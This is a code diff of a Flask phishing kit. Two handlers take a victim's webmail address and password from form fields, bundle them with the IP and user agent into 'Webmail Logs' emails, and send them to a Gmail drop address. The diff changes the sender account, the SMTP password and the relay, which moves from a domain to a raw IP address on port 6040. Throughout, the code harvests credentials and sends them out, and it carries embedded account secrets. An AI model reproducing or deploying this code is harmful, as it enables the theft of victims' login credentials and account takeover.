@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logsvote@guide-level.com"
+        sender_email = "contact@elitegenesis.bio"
         sender_emaill = "contact"
         receiver_email = "Pharhjoe@gmail.com"
-        password = "7y?H=umAQ3V}"
+        password = "vip094e55c9c4a5"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Webmail Logs "
@@ -210,8 +210,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
-            server.login(sender_email, password)
+        with smtplib.SMTP("45.150.109.102", 6040) as server:
+            server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logsvote@guide-level.com"
+        sender_email = "contact@elitegenesis.bio"
         sender_emaill = "contact"
         receiver_email = "Pharhjoe@gmail.com"
-        password = "7y?H=umAQ3V}"
+        password = "vip094e55c9c4a5"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Webmail Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+        with smtplib.SMTP("45.150.109.102", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
